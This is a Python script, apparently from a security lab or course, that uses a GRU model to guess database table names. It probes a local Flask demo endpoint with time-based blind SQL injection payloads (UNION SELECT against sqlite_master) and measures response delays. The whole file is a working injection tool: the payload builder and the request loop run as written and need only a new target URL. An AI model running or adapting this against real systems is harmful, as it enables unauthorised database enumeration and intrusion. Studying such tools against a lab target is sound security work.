import os
import time
import numpy as np
import requests
import tensorflow as tf
from urllib.parse import quote_plus

# Paths
DATA_DIR = os.path.join("data")
MODEL_PATH = os.path.join("trained_models", "blind_sqli_gru_model.h5")

# Target: Flask demo time-based endpoint
TARGET = "http://127.0.0.1:5000/time"
PARAM = "username"
# Delay on hit is 4s trong demo (TIME_DELAY trong app.py)
DELAY = 4.0


def load_vocab():
    """Build vocab from cleaned table/column names (comments ignored)."""
    names = set()
    for path in (
        os.path.join(DATA_DIR, "common-tables.txt"),
        os.path.join(DATA_DIR, "common-columns.txt"),
    ):
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    names.add(line)
    text = "\n".join(sorted(names)) + "\n"
    vocab = sorted(set(text))
    return vocab, text


vocab, text = load_vocab()
char2idx = {c: i for i, c in enumerate(vocab)}
idx2char = {i: c for i, c in enumerate(vocab)}

SEQ_LENGTH = 20


def build_training_data():
    """Chuẩn hóa dữ liệu huấn luyện nhanh để fallback khi load model lỗi."""
    text_as_int = np.array([char2idx[c] for c in text], dtype=np.int32)
    inputs, targets = [], []
    for i in range(len(text_as_int) - SEQ_LENGTH):
        inputs.append(text_as_int[i : i + SEQ_LENGTH])
        targets.append(text_as_int[i + SEQ_LENGTH])
    X = np.array(inputs, dtype=np.int32)
    y = np.array(targets, dtype=np.int32)
    return X, y


def retrain_model_for_compat(epochs=5):
    """Huấn luyện nhanh model mới nếu file .h5 không load được (lệch version Keras)."""
    print("[!] Load model thất bại do khác version Keras. Đang huấn luyện nhẹ để tương thích…")
    X, y = build_training_data()
    model = tf.keras.Sequential(
        [
            tf.keras.layers.Embedding(len(vocab), 128),
            tf.keras.layers.GRU(256, return_sequences=True, dropout=0.2),
            tf.keras.layers.GRU(256, dropout=0.2),
            tf.keras.layers.Dense(256, activation="relu"),
            tf.keras.layers.Dropout(0.2),
            tf.keras.layers.Dense(len(vocab), activation="softmax"),
        ]
    )
    model.compile(
        optimizer=tf.keras.optimizers.Adam(learning_rate=1e-3),
        loss="sparse_categorical_crossentropy",
    )
    model.fit(X, y, batch_size=256, epochs=epochs, verbose=0)
    os.makedirs(os.path.dirname(MODEL_PATH), exist_ok=True)
    try:
        model.save(MODEL_PATH)
        print(f"[+] Đã lưu model mới tại {MODEL_PATH}")
    except Exception as e:
        print(f"[!] Không lưu được model: {e}")
    return model


def load_model_with_fallback():
    try:
        return tf.keras.models.load_model(MODEL_PATH, compile=False, safe_mode=False)
    except TypeError:
        # safe_mode không có trong Keras cũ
        try:
            return tf.keras.models.load_model(MODEL_PATH, compile=False)
        except Exception as e:
            print(f"[!] Load model .h5 lỗi: {e}")
            return retrain_model_for_compat()
    except Exception as e:
        print(f"[!] Load model .h5 lỗi: {e}")
        return retrain_model_for_compat()


model = load_model_with_fallback()


def generate_name(max_len=20, temperature=0.8):
    sequence = [char2idx["\n"]]
    name = ""
    for _ in range(max_len):
        x = np.array([sequence])
        preds = model.predict(x, verbose=0)[0]
        # temperature sampling
        probs = np.asarray(preds).astype("float64")
        probs = np.log(probs + 1e-9) / max(temperature, 1e-3)
        probs = np.exp(probs) / np.sum(np.exp(probs))
        next_idx = np.random.choice(len(probs), p=probs)
        next_char = idx2char[next_idx]
        if next_char == "\n":
            break
        name += next_char
        sequence.append(next_idx)
    return name


def build_sqlite_time_payload(table_name: str) -> str:
    """
    Tận dụng query tại /time: SELECT * FROM users WHERE username = '{payload}'
    Chèn UNION để nếu bảng tồn tại sẽ trả về ít nhất 1 dòng → server sleep.
    """
    # users có 4 cột, nên UNION SELECT 4 cột tương ứng
    injected = (
        f"admin' UNION SELECT 1,'{table_name}','p','r' "
        f"FROM sqlite_master WHERE name='{table_name}' -- -"
    )
    return injected


def send_payload(payload: str) -> float:
    try:
        t1 = time.time()
        # URL-encode payload để an toàn khi gửi
        requests.get(f"{TARGET}?{PARAM}={quote_plus(payload)}", timeout=DELAY + 2)
        t2 = time.time()
        return t2 - t1
    except requests.exceptions.Timeout:
        return DELAY


def main():
    print(f"[+] Target: {TARGET}?{PARAM}=<payload>")
    print("[+] Sinh tên bằng GRU và kiểm tra bảng SQLite demo (users/dns_logs/attack_logs...)")
    for i in range(20):
        name = generate_name()
        payload = build_sqlite_time_payload(name)
        t = send_payload(payload)
        print(f"[{i+1:02}] '{name}' -> {t:.2f}s")
        if t >= DELAY:
            print(f"[+] Nghi ngờ bảng tồn tại hoặc payload làm trễ: {name}")
            break
    else:
        print("[!] Hết danh sách thử nhưng chưa có dấu hiệu trễ.")


if __name__ == "__main__":
    main()
